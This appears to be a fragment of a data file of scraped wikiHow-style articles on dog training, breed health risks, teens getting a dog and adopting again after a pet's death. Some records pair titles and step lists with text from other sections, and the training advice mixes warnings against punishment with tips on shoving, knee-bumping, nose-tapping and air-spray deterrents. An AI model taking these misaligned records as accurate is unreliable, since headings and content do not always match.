, Be aware that scolding a dog rarely has a place in dog training. Dogs live in the present and if you scold a dog it just links the negativity to you, and becomes wary of you, rather than learning a lesson, which can damage your relationship. On occasions when you are present and wish to correct behavior, such as the dog on the sofa, use a disapproving facial expression and a disapproving noise, to show you are not happy, but punishing by shouting or physical violence achieves nothing other than to damage your bond.


Aggression often incites a fear response in dogs, not a true trained response. If you hit a dog too much or too harshly, he or she can become nervous of hands approaching it. So when a child goes to stroke the dog, all the dog sees is the same hand that hit it approaching. He or she is scared and thinks ""Is this person going to hit me today?"" So the dog bites out of fear.

"
"
Start by training your dog to ""sit."",
Teach your dog to stay on command.,
Teach recall.,
Train your dog to go to the bathroom outside.,
Teach your dog to leave items alone.,
Teach your dog to stay off furniture.,
Teach your dog to stay off of people, even when it is excited to see someone.",How to Train an Adult Dog3," Building a solid ""sit"" command places you in control of a whole variety of situations. For example, if your dog hears the doorbell and rushes to bark, you can interrupt this behavior by asking it to sit, then rewarding the ""sit,"" and removing the dog to a back room where it won't bark.


To teach sit, show the dog you have a treat in your hand. Show it the treat at nose level, then arc the treat up above its nose. Say ""sit."" Your dog's head will follow the treat, leading the pup's head to go up and it's bottom to go down. The moment the pup's bottom hits the ground, click-clack the clicker and give it a reward.Once your dog is doing this regularly, start to skip the treat. This builds unpredictability in the dog's mind about whether he or she gets a reward or not and stops it taking them for granted. This means the dog works harder. Eventually, just reward every fourth or fifth command.
Once your dog is sitting regularly on command, ask him or her to do this when out and about, before putting its food down, and at the curbside before crossing a street.

, Stay is taught in a similar way to ""sit"". Get the dog in a sit first, then take one step away. Say ""stay"", and when the dog doesn't move, click-clack and reward, plus give it lots of fuss. Gradually increase the distance, until you are eventually able to leave the room without the dog moving., To teach recall, start in a small space, so the dog is never terribly far away. When it turns and takes a step towards you, give a cue ""here."" As the dog continues moving toward your click-clack, and when it arrives, give him or her a big fuss and a treat. Keep repeating this, until the dog understands what you want it to do. Tell it to come whenever you feed it or under any other circumstance that it will come to you regardless.


Make coming to you a good thing for your dog. Be excited, and reward often. Start with short 'come' distances and be sure to release the dog quickly to go to what it was doing.
Recall is a commonly the cause of much confusion for dog and owner alike. The problem is that it's human nature to reprimand the dog when it eventually comes to you after 30 minutes of calling it. This teaches the dog that when it comes, you get cross, and therefore the dog would really rather not come back at all. Telling the dog off gives him or her conflicting instructions. Instead, no matter how long it takes, always be pleased to see your pet and make a big fuss of him or her.Once the dog has mastered the command in a small room, try it in the yard. A word of warning though, unless you are completely confident of your dog's recall don't let him or her off leash in the park. Keep the dog on a long line so that you can reel it in if it doesn't obey.

, If the dog is poorly house trained, then go back to basics and retrain in the same way you would teach a puppy. Give the dog plenty of exercise, and then back home keep him confined to a small room or a crate (teach him to love the crate. How to Crate Train your Puppy ) Take him outside every hour, and when he squats or relieves himself, say the cue word ""Potty"" or ""toilet"" and when he's finished give him a big reward. Also do this first thing in the morning and last thing at night. Eventually he will realize it's a super easy way to get a treat, is to spend his bladder and bowel contents in a particular place in order to earn a treat.


If he does have an accident in doors, don't scold him or tell him off. Instead, calmly clear it up using an enzymatic clear, so there are no scent clues left for him to return to the spot. Avoid using household cleaners, especially those containing bleach, since ammonia is part of urine and you can unwittingly reinforce the smell. , To teach the dog to ""drop it"", start with something the dog may pick up but that isn't his or her all time favorite toy. Let the dog pick the object up, then offer it the ultra tasty treat in return. Your pup has to drop the object to get the treat, so as its jaw relaxes its grip say ""drop it."" Click as the dog drops the toy and give it the treat. Keep repeating this as with other commands.


Once trained, if you come across something that you do not want your dog to eat and it seems interested, tell the dog to leave it alone. Praise it when it switches its attention towards you.
While training the dog, remove temptation from his or her path. However, if the dog does pick something up, especially if it could potentially harm it if swallowed, then push on its cheeks near the back of the jawbone and praise it for dropping it. Again, never use force to pry a dogs mouth open to retrieve something unless its dangerous, like medicine of something sharp.

, If your dog climbs on furniture or jumps on you without permission, tell it to get off in a scolding manner and praise it when it does. If necessary, shove it off the furniture. If it jumps on you without permission, make a disapproving noise and move your knee forward to bump it. Keeping a lead attached in the house is also a good way of removing the dog, but without getting in danger if he is inclined to snap when removed from furniture. Limit the verbal interaction until the dog is down.

, To teach a dog to get down, use treats and a command, such as ""off"". If this doesn't help, use a canister of compressed air that has a motion trigger, in front of the furniture, so the dog gets a remote punishment when he goes to jump up.

Remember that you are training an adult dog that already has a lifetime of experiences.,
Take medical conditions into consideration.,
Take the time to understand your adult dog and know what makes him or her tick.",How to Train an Adult Dog4," Training is a life-long process and something that should be ongoing no matter what the age of your dog. However, if you have rescued an adult dog, or realised your dog has got into bad habits, then you need to know the best way to go about training an adult dog.

, A good start is to get the dog checked out by your veterinarian. This allows you to be aware of any limitations the dog has, and also if they are health issues that could explain problems with obedience.


For example if the dog refuses to sit, it might be the she or he has painful hips, which can make sitting difficult to do. The answer is then to start pain-relieving medication and to consider an alternative command such as ""stand.""
In addition, if the adult dog seems wilfully disobedient, it can then be salient to learn that they are deaf, and therefore not hearing your commands. Knowing this can then let you change to hand signals, instead of verbal commands, for the dog to respond to., For example, if the dog is aggressive with strange dogs, is that as a result of fear or guarding territory? Knowing the trigger can help you retrain more effectively, by building his self-confidence around other dogs or removing toys that he is territorial about.


If he keeps running away, but he's an unneutered male, then getting him desexed can really help.
Work out what areas of your dog's training are weak so you can target those areas. Does he have a specific bad habit that needs to be addressed, or could his training just use some general sharpening up?
If his responses are excellent, then look at teaching him some tricks. Training is an excellent way to bond with your dog and help him to understand you are in charge. In fact, training a grieving dog can help distract them and ease their grief, as they enjoy the one-to-one time with their owner and it helps feel secure that you are in charge."

Monitor your dog's health actively.,
Familiarize yourself with the health problems that may affect your dog.,
Have a veterinarian check on any eye issues.,
Watch for signs of epilepsy in young Beagles.,
Closely monitor Great Danes for developmental issues.,
Watch out for excessive bleeding.",How to Prepare for Breed Specific Health Problems in Dogs1," You likely already know that you should take your dog to the veterinarian for an annual checkup, even if they seem to be entirely healthy. This will help your veterinarian spot any symptoms that you don't notice and address potential issues before they are more dangerous.


Further, whenever your dog's behavior changes unexpectedly, they become easily bothered, or seem to be in pain, don't hesitate to bring them in for a check up.
Meanwhile, make sure you're providing your dog with a healthy lifestyle - including a consistent diet and lots of exercise.;
, Many breed-specific conditions and risks exist. In order to help your dog stay as healthy as possible, ask your veterinarian what you should watch out for. For even more in depth information, consult a publication by a trusted veterinary organization regarding the risks your dog may face.Look online for breed-specific associations. If one of these associations exists for your dog's breed, contact them or check their website for information about health issues that your dog may be likely to face.

, Some dogs, such as Siberian Huskies, are genetically predisposed to progressive eye diseases. If any symptoms emerge that affect your dog’s eyes, especially when they are young, notify your veterinarian immediately. Surgery may be able to prevent blindness.Note that Huskies are prone to many genetic diseases, including autoimmune diseases and some skin conditions.

, Any dog can have epilepsy, but Beagles are especially prone. This brain disorder usually begins to cause seizures between 6 months and three years of age. Though epilepsy cannot be cured, medicine can help minimize the number and dangers of seizures.Note that Boxers are also prone to epilepsy.
Beagles are also prone to hypothyroidism, ear infections, diabetes, obesity, and eye problems. Signs of hypothyroidism include lethargy, skin abnormalities, and a slow heart rate.

, Technically classified as a “giant” breed, the health complications that accompany Great Danes’ immense size have led to the nickname of the “Heartbreak Breed.” Most prevalent are musculoskeletal and heart issues.Because of their rapid growth, Great Danes are also prone to Wobbler’s disease. If your Great Dane seems to have weakness in their legs, take them to the veterinarian.

, Von Willebrand is an inherited disease that results in excessive bleeding, even after minor injuries. The most common sign of the disease is frequent nosebleeds. Since the dog’s blood has trouble clotting, they are at risk of losing large amounts of blood quickly, and will likely need blood transfusions following surgery or significant injury.Breeds that are likely to suffer from this disease include German Shepherds and Dobermans.

Consider clicker training your dog.",How to Train French Bulldogs," Avoid letting your dog get familiar with toileting indoors if you'd like it to toilet outside. If you have a place in your yard where you'd like your dog to toilet, bring it to the spot immediately. Before you even go into your house, let it sniff around the yard until your dog urinates or defecates.When your dog does urinate or defecate, give your dog lots of verbal praise and attention so your dog associates going to the bathroom outside with being praised.;
, In order to make your French bulldog a good household member, begin potty training your dog as soon as you get it. If you wait to begin training and let your dog toilet on puppy pads, it will take longer to potty train it and you dog will be confused about where to toilet.You'll need to be very consistent and encouraging when you begin housebreaking your French bulldog.

, Most dogs will show signs that they need to toilet, so watch your French bulldog to become familiar with your dog's specific signs. You should also be in the habit of frequently giving it the opportunity to toilet. Signs that your dog needs to toilet include:Panting
Pacing or sniffing around the house
Barking
Wandering off to a quiet area

, If you didn't notice your dog's cue to toilet or your dog accidentally goes in the house, thoroughly clean up the mess. You'll need to use a product designed for pet messes or a special pet-urine enzymatic cleaner. This will completely remove the scent of urine so your dog doesn't return to the same spot to toilet later.Don't scold or hit your dog for having an accident. Your dog won't be able to associate the punishment with the action (toileting inside) and your dog will learn not to trust you.

, Choose a crate that will be large enough for your French bulldog. Your dog should be able to stand normally without a hunched back inside the crate. If your French bulldog isn't fully grown, allow enough room for your puppy to grow into its full adult size. Your dog should also be able to turn around comfortably.Using a crate is one of the best ways to housebreak your French bulldog. The crate also gives your dog a safe space when your dog needs to retreat or you have to leave your dog alone for a little bit.

, Assemble the crate (if needed) and place a crate pad or soft blanket in the bottom. To encourage your French bulldog to use the crate, put a few healthy treats in the crate, but don't leave food or water in it. Your dog should feel comfortable and safe in its crate.You should place the crate somewhere quiet, but also where your dog can interact with people. Your dog shouldn't feel isolated or punished when your dog's in the crate.

, Leave the kennel door open and encourage your dog to enter the crate on its own. Let your dog do this often for several days and then shut the door behind your dog. Leave your dog in the crate for 10 minutes and sit next to your during this time. Let your dog out when your dog's quiet.Never let your dog out if your dog is whining or pawing at the door of the crate.

, Slowly keep your dog in the crate for longer periods of time. Once you've worked up to 30 minutes, you can leave it in the crate for short periods of time. Older dogs can stay in the crate for up to 4 hours at a stretch (which is how long they can hold their bladders).Never leave your dog in a crate for longer than this or use the crate as a punishment. If you do, your dog may resist going in the crate.

, Make sure your dog's crate is in a quiet spot where people won't be coming and going. To crate your dog overnight, play with your dog a lot so your dog is tired and set a treat in the crate. Close the door once your dog's in the crate and leave the room. Don't reenter the room while your dog is still crying.Remember that you'll still need to get up in the night to let your dog go out and toilet. If your puppy is under 4 months old, let your dog out every 2 to 3 hours. If your dog is older, you should let your dog out at least every 4 hours.

, As soon as you get your French bulldog, make your dog part of your family and household. Don't feel like you need to shield it from noisy activities or energetic family members. Just make sure the activity or noise is non-threatening.For example, don't tease your new dog by chasing it with a broom or vacuum. This will cause it to fear the noise or you.

, Your French bulldog should be comfortable with riding in vehicles. This way, if you ever need to take it to the vet, your dog won't be traumatized. Riding in a car will also introduce your dog to street sights and sounds from the car window. To keep you and your dog safe, your dog should be secured in a harness or carrier while you're driving.Just remember not to take your dog along in the car if it's a very hot or humid day. Dogs can die if left in a hot car, even if left alone for only a few minutes.

, Choose a dog park so your dog can practice playing with other dogs and interacting with humans. Playing at the park is also a good chance for your dog to burn off some energy. Just be sure that your dog has had its first two distemper vaccines before taking it to a dog park.To prevent dog fighting and keep control over your dog, keep it on a leash.

, You should try to expose your dog to as many different dogs, people, and sights and sounds as you can. If you feel like your dog needs more interaction, consider signing it up for a socialization or obedience class. Your French bulldog will get personal time with other humans and dogs while getting important training.You can find dog classes at local community centers, through 4-H clubs, or pet shops. You can also ask your vet to recommend socialization classes.

, If your French bulldog is young, keep training sessions to about 5 minutes, increasing the time if your dog is older. Plan on doing 3 to 5 training sessions a day. Try to pick times when your dog isn't hungry or tired so your dog will be more focused on learning. Be consistent and patient with your dog.The lessons should build on each other, so start with simpler commands before moving on to commands that require your dog to know additional commands.

, This command will come in useful when you need to teach your dog not to bite or chew (natural tendencies for younger dogs). If your dog bites or nips you or you see your dog chewing, tap its nose lightly and say, ""No bite"" or ""No chew."" Remove your hand from your dog's mouth and replace it with a toy.Giving an acceptable chew toy will distract your dog and teach it what is appropriate to chew.

, Have your dog stand in front of you and place a treat in your hand so your dog can see it in your palm. Firmly say, ""sit"" in a friendly voice while you push your dog's bottom down until your dog sits. Give your dog the treat immediately and tell it good job. Repeat this process by stepping away from your dog. Turn to face your dog and tell it to sit.Keep pushing down your dog's bottom and praising it as you did before until your dog sits on its own.

, Place your dog in a sit position while you put a treat in your hand. Make sure your dog knows you have the treat in your hand and put your hand near its nose. Move your hand to the floor while you say ""down"" or ""lay down."" Your dog will follow your hand to the floor by starting to lay down. As soon as your dog does (or tries), give the treat and praise. Practice this command until your dog goes down consistently.


If your young dog jumps to your attention or while playing, keep your dog on a leash to correct its behavior. As your dog starts to jump, command your dog to ""sit"" and reward. Your dog will learn not to jump on people., Have your dog sit and praise your dog when your dog obeys. Put your hand in front of its face like you're hand is a stop sign. Firmly say ""stay"" and back away slowly. If your dog starts to run to you, start again by commanding your dog to sit. Repeat the command to stay and back away again. Repeat this until your dog consistently obeys.Don't let your dog off the leash until your dog knows the stay command and follows it consistently.

, Begin this command when your dog is playing or sniffing around a fenced area. Crouch down, slap your thighs and say ""come"" in a friendly voice. This will make your dog think you want to play and your dog will run over to play with you. When your dog does, reward it with a treat and lots of praise.Use this command when your dog is doing something potentially dangerous to get your dog to come to you quickly.Practice this command at different times when your puppy is distracted. This is a good way to test your dog's response to the command.

, If your dog begins barking and you need to silence your dog, keep a bag of treats handy. When your dog barks, take a treat out and say ""quiet."" Draw its attention to the treat and when your dog stops barking, immediately give it the reward.Giving the reward immediately helps your dog associate the command ""quiet"" with quieting down. It may take a while but eventually your dog will understand that you expect it to quiet down when you say quiet.

, Teach your dog to associate a clicking sound from a clicker device as a reward for following a command. To do this, click the device and give your dog a treat. Practice training your dog and whenever it obeys, click the device and give a treat. Eventually, your dog will associate correct behavior with the clicker sound.


Once your dog is familiar with the clicker, you can wean your dog off the treats and clicking sound so that the dog just responds to the command and clicker.

Be careful exercising with flat-faced dogs.,
Keep brachycephalic dogs indoors during hot weather.,
Do not feed your dog in immediate proximity to exercising.",How to Prepare for Breed Specific Health Problems in Dogs2," Bulldogs are one of the breeds most likely to develop health problems. This is part because of the shape of their faces. More specifically, flat-faced dogs such as bulldogs are especially prone to brachycephalic airway syndrome. In lay terms, these dogs’ narrow upper airways make it difficult for them to breathe normally, and they are likely to develop potentially serious breathing complications.Other types of brachycephalic dogs include Boston Terriers, other types of bulldogs, Boxers, and Pugs.
Stop frequently on jogs and walks with a brachycephalic dog, and make sure you bring plenty of water and choose routes with lots of shaded spots to rest.
One sign of potential breathing issues is loud snoring. If your dog breathes especially loudly at night, let your veterinarian know.

, Pugs are another flat-faced breed that are likely to develop breathing conditions. Aside from narrow airways, they also have small nostrils and large palates, making even normal breathing challenging. They are also especially prone to heatstroke.Avoid strenuous exercise with your Pug as well, as it may further complicate their ability to breathe. These same rules apply to French Bulldogs, who also have the disadvantage of narrow tracheae.
Note that Pugs are also likely to suffer from eye and skin conditions, and that French Bulldogs are likely to suffer from orthopedic problems. In fact, the health complications associated with small, commonly inbred brachycephalic dogs such as these have led many veterinarians to recommend against owning these breeds.

, Some dog breeds, such a German Short-haired Pointers, are especially prone to bloat. Bloat is not only uncomfortable, it is also especially dangerous for dogs, as it can restrict blood flow to vital organs.Feed dogs that eat quickly, including pointers, small meals. Further, make sure to never feed your dog within the 30 minutes preceding or following strenuous exercise.
Note that German Short-hairs are generally quite healthy, but can also be susceptible to heart issues, skin disorders, and eye problems.

Talk to your veterinarian about how to postpone arthritis.,
Treat musculoskeletal issues in small dogs immediately.,
Keep big dogs active.",How to Prepare for Breed Specific Health Problems in Dogs3," Many large-breed dogs, such as German Shepherds, are especially prone to musculoskeletal disorders such as hip dysplasia and elbow dysplasia. These conditions can lead to pain, arthritis, and potentially lameness. Medication can help postpone arthritis, but should only be provided with the consent of your veterinarian.In serious cases, surgery is often necessary to repair the musculoskeletal issues that large dog breeds are likely to develop.

, Small dogs, such as Shih Tzus, Yorkshire Terriers, and Dachshunds, may be at greater risk of specific musculoskeletal problems, such as inter-vertebral disc disease, hip dysplasia, and patellar luxation. Note that these dogs’ risk for injury from jumping, climbing stairs, or vigorous exercise is greater than in other breeds.Patellar luxation, or “wobbly kneecaps,” may cause the dog to hobble, skip, or limp. If these symptoms develop, or if your dog seems be experiencing a loss of coordination or a loss of sensation, take your dog to the veterinarian.
Note that roughly ¼ of Dachshunds suffer from inter-vertebral disk disease or other musculoskeletal problems.
Shih Tzus are also prone to eye problems and the airway obstructions common in short or flat-nosed breeds. Dachshunds and Yorkshire Terriers are also especially likely to suffer from eye conditions.

, Labrador Retrievers are not only one of the most popular breeds of dogs, they are also among the healthiest. However, they are liable to become obese if they do not got enough exercise, and/or are overfed. In turn, obesity will greatly complicate your Lab’s health, increasing the risk of musculoskeletal issues, joint issues, and diabetes.Make sure that your dog gets at least ten to twenty minutes of moderate exercise twice a day.
Follow your veterinarian’s specific instructions regarding feeding. Be sure to notify them if your dog gains weight rapidly.
Rottweilers are also prone to obesity, as well as potential joint issues.

Start training your Dalmatian immediately.,
Begin house training your dog when you bring him home.,
Use positive reinforcement to encourage good behavior.,
Socialize your dog as a puppy.",How to Train Dalmatians1," From the moment you bring your eight-week old Dalmatian puppy home, he is starting to learn. He is soaking up information about his environment, so it's important you start establishing ground rules from the first day. Dalmatians have a reputation for being stubborn, so start training at the earliest opportunity.For example, if you do not intend to allow the dog on the couch but let him up as a puppy, intending to enforce the rules when you start training in a month or two, the poor dog will be very confused. If you want to keep your dog off the couch, start training him not to get on the couch from the moment you bring him home.;
, Though your Dalmatian might be a puppy when you bring him home, start house training him immediately. This helps your puppy avoid developing any bad habits to begin with. Show your Dalmatian where the toilet spot it.When your dog relieves himself in the correct place, immediately praise him. This is called positive reinforcement. Your praise tells him that what he did is good, and this makes him more likely to repeat the behavior.
To toilet train your Dalmatian you need to supervise him indoors at all time. Keep him on a leash on your wrist, or if you can't be with him, put him in his crate for short periods of time. Every hour, take your dog to the toilet spot and praise him when he relieves himself or offer a treat. Pretty soon he'll get the idea he can get treats for free just by eliminating outside.
Simply letting the dog relieve himself without giving feedback in the form of praise is an opportunity wasted.

, At your puppy’s young age, you are teaching him to trust you. You want your Dalmatian to want to please you when you start serious training. This means being gentle with him and using positive reinforcement. Refrain from smacking the dog, and instead praise good behavior.When your Dalmatian puppy misbehaves, which he will do frequently, aim to redirect his behavior onto something more appropriate. For example, if he plays tug with your pants, distract his attention onto a tug toy and then praise him for playing with that.
It is fine to give your puppy guidance that he is wrong for tugging on the trouser with a brief, curt ""No!"" Then, redirect him onto the tug toy with a happy, ""Good!"" This uses positive reinforcement and helps him to make judgement calls about what he's going wrong and right.

, Getting your Dalmatian used to people and other dogs can help prevent some behavior problems later in life. Take your Dalmatian to puppy socialization classes or dog parks so that he is confident around other dogs. This also gives your dog a chance to read other dogs' body language and learn how to react around them.Make sure to get all your dog’s shots before taking him to public places around other dogs.

Research training techniques.,
Take your dog to a dog trainer.,
Create rules and stick to them.,
Use treat to reward your dog.,
Refrain from yelling at your dog.,
Avoid physical punishment.,
Establish short, clear commands.,
Clicker train your dog.",How to Train Dalmatians2," If you have never trained a dog before, you should research how to train a dog before you begin. There are many different techniques and ways to train dogs. You can read websites, check out books from your local library, or contact pet organizations for help.


Understanding how the training techniques work and how long they will take can help prevent frustration for you and your Dalmatian. Know that training takes awhile, so you won’t be able to train your dog overnight.
You may discover you need to use different techniques for different trainings. You may want to crate train your dog, use the clicker method, and use treat rewards for various things.

, If you have never trained a dog before, you may want to seek the assistance of a dog trainer experienced in the use of reward-based training. A trainer can give you support and guidance for training your dog. You may also consider enrolling your dog in obedience school or classes.You may be able to find a dog training school, or you can visit a pet store. Many pet stores offer training classes for puppies.

, One key to happy training for a Dalmatian is being firm but fair. To do this, decide on the ground rules for your dog and stick to them. Voice disapproval if the dog disobeys the rules and distract him onto more appropriate behavior which you can reward. Dalmatians are headstrong dogs, so you need to make sure your are firm and consistent with your rules and training.Changing your mind about what is appropriate or only reinforcing the rules sometimes will confuse your dog.
For example, if he chews your shoe, firmly tell him ""No!"" Then, distract him and offer an appropriate chew toy with a happy ""Good.""

, One good way to reinforce good behavior in your Dalmatian is to use treats to reward him. When you are teaching your dog a command, like “Sit” or “Stop,” or trying to house train him, you should follow good behavior with a food treat. You can try rewarding your dog with pieces of his dog food, or you can buy treats you use to reward the behavior.Only use treats as a reward when you are starting the training process. As your dog undergoes training and starts to learn the correct behavior, food treats should be replaced with verbal praise. Too many food treats can lead to obesity.
When your Dalmatian starts to learn the commands, start mixing up when you give him the treat rewards. Giving your dog treats every time he completes an action can make him complacent and expect treat. Not giving him a treat every time will make him work harder for a treat since he realizes it’s not guaranteed anymore.

, Yelling at your dog and getting frustrated won’t be an effective way to train your dog. Dogs can pick up on your frustration and anger, and it may upset your dog. Dalmatians are excitable, so you getting upset and yelling may cause your dog to start getting excited, start barking, and start running around.Instead, use a firm, calm tone when you correct your dog. Remember, your dog will not learn how to act overnight. Use positive reinforcement and firm, direct commands to replace bad behavior with good behavior.

, Understand that punishing your Dalmatian will more than likely backfire. He is liable not to link the punishment to the action, like chewing the shoe. Instead, he will link the punishment to you, as the punisher. This will harm his trust in you and will make him frustrated, and possibly defensive, which could end in aggressive behavior.Don’t hit your dog with your hand, a rolled up newspaper, or another object. Never kick a dog.

, Work on basic commands, such as “Stop,” ""Sit"", ""Drop"", and ""Come."" These commands can be used to control your dog in most situations. Be consistent with the words you use. Don’t switch the command and expect your dog to give you a response.Make sure to limit your commands to one words. Dogs aren’t human. They don’t understand language, so don’t talk to your dog. For example, don’t say, “Please stop biting at my leg.” Instead, simply say, “Stop!”

, You may want to consider clicker training your dog. This method trains the dog to associate the clicking sound of a clicker with a reward. The click designates the good behavior, which leads to a treat. This helps build a link for your dog between the good behavior and the reward.By using clicker training, your Dalmatian will be trained to know that clicks are followed by treats. Eventually, your dog will learn that doing an action when commanded gets him rewards.

Learn all you can about Dalmatians.,
Provide your Dalmatian with plenty of exercise.,
Give your dog chew toys.,
Avoid over-exciting your Dalmatian puppy.",How to Train Dalmatians3," To get the most out of your training experience, you should learn everything you can about Dalmatians. Read books or websites about the breed, or talk to professional organizations or breeders. Once you understand the temperament and personality of the Dalmatian, you can be better prepared to train.Learning about the breed can help you know what kinds of things to expect from your dog. You can be prepared for bad habits or negative behaviors. You may learn tips on things you can do to deter bad behavior.
Understanding the breed can also help you learn which training methods made be better for the breed.

, Dalmatians were originally intended to walk behind carriages. This means that Dalmatians need a lot of exercise and physical activity. Dalmatians who do not receive enough exercise become bored, and a bored dog is a dog looking for trouble. Bad behavior such as chewing, barking, or unruliness will be the result if an active breed such as the Dalmatian does not receive sufficient exercise.A Dalmatian can easily soak up two separate one hour runs a day and still have energy to spare. You can take your training to the park where you can throw a ball and have your dog learn to fetch and retrieve, running backwards and forwards in the process.
Avoid leaving your Dalmatian for hours unattended in the yard as he will use his energy to bark at passersby or dig in the flower beds.

, Dalmatians love to chew. Be sure to provide plenty of exciting chew toys for him at all times. They also get bored easily, so giving them chew toys to keep their minds active can help prevent behavior problems.Consider feeding your Dalmatian dry kibble inside a Kong or use a puzzle feeder so that he uses mental energy to get food, which helps to relieve boredom.

, Dalmatian puppies have a tendency to get over-excited. If your Dalmatian puppy gets over-excited, he will stop listening to you. This is when mouthing, biting, and general bad behavior creeps in. To prevent this, pause every 15 seconds or so during play and get your Dalmatian to calm down.


Calming your Dalmatian is easily achieved by offering a small piece of his meal kibble as a reward. You can make this work double time by asking him to sit using the piece of kibble at the same time.

Be proactive with your chores.,
Take on more responsibilities.,
Keep your grades up.,
Get a part-time job.",How to Get a Dog While You're a Teen1," Instead of waiting for your parents to remind you to do your chores, do them ahead of time without them having to ask or remind you to do them. This way, when you are convincing your parents to let you have a dog, you can reference these instances to show them that you are committed to responsibility. For example, if one of your responsibilities is to clean your room, then clean it regularly to ensure that it is tidy. The next time your parents (or one of them) see your room they will be impressed that they did not have to tell you.
Instead of having your parents wake you up for school every morning, wake yourself up every morning.;
, Ask your parents if they have any jobs for you. Tell them that you want weekly or monthly jobs, not just daily jobs. This way, you will be able to show them that you can commit to and sustain a job over a long period of time—an important skill you will need in order to take care of a dog.Extra jobs that you can take on are cleaning the dishes after dinner every night, yard work, offering to help take care of younger siblings, and/or taking the garbage out.

, Keeping your grades in good standing is another important way to show that you are responsible. If your grades are low, now is the time to improve them. By improving your grades on your own, you are demonstrating a certain level of responsibility and initiative—skills that are needed to take care of a dog.


If your grades are low, speak with your teacher and other students about ways to improve your grades.
If you have good grades, use this as a way to demonstrate to your parents that you have a sense of what responsibility entails.

, If you are able to keep a part-time job for at least a couple of months, this will demonstrate that you are ready to take on more responsibilities, like caring for a dog. A part-time job will also enable you to help pay for any expenses that come with owning a dog. Offering to help pay for some of the expenses might also persuade your parents into letting you have a dog.For example, mow your neighbors’ lawns, babysit or pet sit for your neighbors or family members, get a job nearby at your local grocery store, or take on a newspaper route.

Find a veterinarian.",How to Get Another Dog After a Pet Dog's Death," There is no set amount of time you must allow to get over the loss of a pet. The amount of time needed to grieve is different for every person and situation. You must, however, let yourself go through the grieving process before getting another pet. Rushing into adopting another dog won’t be fair to you or your new dog.It can be tempting to rush to get another dog shortly after your dog dies. Some people think this will fill the void left in their life or take their mind off losing their pet. While getting a new dog may help do these things, if you’re not ready for a new dog it can be tough on both of you.;
, Losing a dog, whether unexpectedly or not, can cause an array of emotions, including grief, guilt, confusion, anger, and depression. The type of reactions you experience can depend on a number of things, including your upbringing, personality, and the way the dog died. The emotions you feel and the intensity at which you feel them is different for every person and in every situation. After the loss of a dog, pay close attention to how you are feeling about its death. Your ability to deal with these emotions and work through them will have a profound impact on your readiness to get another dog.For example, say you left your apartment door open slightly and your dog ran out into the street and got hit by a car. You may have intense feelings of guilt over this, feeling that you were part of the reason your pet died. Until you can forgive yourself and work through this guilt, you probably won’t be able to care for a new dog properly.
However, if your dog died of natural causes at 16 years old, you likely won’t feel guilt over its death. While you will still need to work through your grief over your loss, you may be able to accept your pet’s death much more quickly, and therefore be able to properly care for a new dog much sooner.

, The grieving process is different for every individual. For some people, it might only take months to grieve the loss of a dog, but for others, this process could take years. When you’re considering getting a new dog after a pet’s death, ask yourself if you’re ready to make a commitment to another dog. The following questions can help you in your decision:


Do I have time for a new dog? Can I devote time to training and socializing it?
Am I happy without a dog? Are there things I’ve been putting off while caring for my old dog?Ask yourself why you want another dog—what purpose will a new dog have in your life? If you’re getting a new dog just to fill the void of losing your old one, or to ease the pain, you should wait., One of the toughest things for people to understand after losing a dog is that a new dog is not, and should not be looked at, as a replacement for your old dog. Nothing will every replace your old dog. Your new dog will have a different personality and quirks, and you will need to build a whole new relationship with it.


It can help to get a different breed or a different sex when selecting a new dog. This can help you not to make comparisons between your old dog and new dog., Depending on how long you had your previous dog, your living situation might have changed significantly since you first got it. When deciding what type of dog to get, consider your new situation. This can affect such things as whether you want a big dog or little one, a puppy or a mature dog, or a long-haired or short-haired one. Ask yourself some of the following questions to help you decide which type of dog will best suit your new needs and lifestyle:


Are you living in an apartment or a home with a backyard?
If you work full-time, is there anyone who can help you with training your new dog?
What type of climate do you live in?
How much time and energy are you willing and able to put into taking care of a new dog?, Your health may have changed since you adopted your last dog as well. You must also take this into consideration when you’re trying to figure out what kind of dog to get. Larger breeds will need more physical activity than smaller breeds. Different breeds have different energy levels as well. Choose a dog that will be compatible with your current abilities., Taking into consideration your current situation, list all the qualities you want in your new dog, starting with the most important at the top. This will make it easier to focus on the qualities that are most important when you’re picking out your new dog., Animal shelters often have tons of great dogs available for adoption. As long as you know what you’re looking for in your new pet, you will probably be able to find a suitable dog at a shelter near you. Shelters also have many different breeds of dog available, so if you aren’t set on a particular breed, this can be a good way to get acquainted with several different ones before deciding.The staff at animal shelters are often familiar with many different breeds of dog so they can probably help you decide which might be the best fit for you.Don’t get discouraged if you don’t find your new companion right away. You may have to look at a lot of shelters, and a lot of dogs, before you find the one that is the right fit for you.
There are also rescues for just about every breed of dog. If you have a specific breed in mind, this may be a good option since all of their dogs will be the type of breed you’re looking for., If you know what breed of dog you want, contacting local breeders may be a good option as well. As long as the breeder is responsible, you can likely find a puppy that is healthy and well cared for from a breeder.


Keep in mind that this will probably be a much more expensive option than adopting from a shelter or rescue. On average, puppies obtained from a breeder cost anywhere from several hundred dollars up to several thousand.In addition, most breeders only sell puppies. If you’re looking for an older dog, a breeder probably won’t be the right option for you.
Always ask to take a look around your breeder’s premises before buying from them. You want to make sure your puppy was treated well and raised under good conditions before deciding to buy., Pet stores may also have a variety of dogs to choose from. While many will be puppies, they may have some older dogs as well.


Pet stores, however, are becoming a less popular place to get a dog, with many people preferring to adopt from shelters or buy from a breeder. Many people believe most pet stores get their puppies from puppy mills where there is abuse and ill-treatment of dogs. Puppy mill dogs can also suffer from a number of health problems.Do your research and trust your gut. If you get a bad feeling from a pet store, it is best to keep looking.

, No matter where you get your dog, the staff or breeder should be able to give you some insight into its personality and temperament. Ask them things like how it gets along with the other dogs, with new people, and with children.


For example, if your new dog will be around new people often, a shy dog may not be the right choice for you. A dog that is outgoing and friendly towards new people might be a better choice.

, Whether it has been only a few months since you’ve had a dog or a few years, there are things you need to take care of around your house before brining your new dog home. Dog-proofing your house before your new pup comes home will ensure your new dog, and your belongings, are kept safe.


Ensure electrical cords are inaccessible.
Block off any areas of the house you do not want your dog to go into. If you can’t do this by shutting a door, you can often use baby gates to keep dogs out of certain areas.
Move breakable objects out of your dog’s reach.
Keep shoes and other “chewables” tucked away in closets or up on shelves and away from your dog.
Remove or cut off access to any houseplants that may be toxic to your new dog.
